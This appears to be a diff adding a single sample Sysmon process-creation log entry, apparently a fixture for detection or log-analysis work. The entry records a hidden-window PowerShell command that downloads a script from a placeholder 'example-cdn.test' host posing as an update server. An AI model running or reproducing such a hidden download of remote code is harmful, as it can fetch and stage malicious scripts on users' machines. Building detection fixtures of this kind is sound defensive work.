@@ -1,0 +1,9 @@
+Source System: Sysmon
+Event ID: 1
+UtcTime: 2026-07-02T18:12:44Z
+Computer: ENG-WKS-004
+User: CONTOSO\alex.lee
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoProfile -WindowStyle Hidden Invoke-WebRequest http://updates.example-cdn.test/a.ps1
+ParentImage: C:\Windows\explorer.exe
+Hashes: SHA256=8124ab7ce826e3f5f108dd883fc2f71cec5f0d6a7e0d29f46e8577dc7a8f4dc0
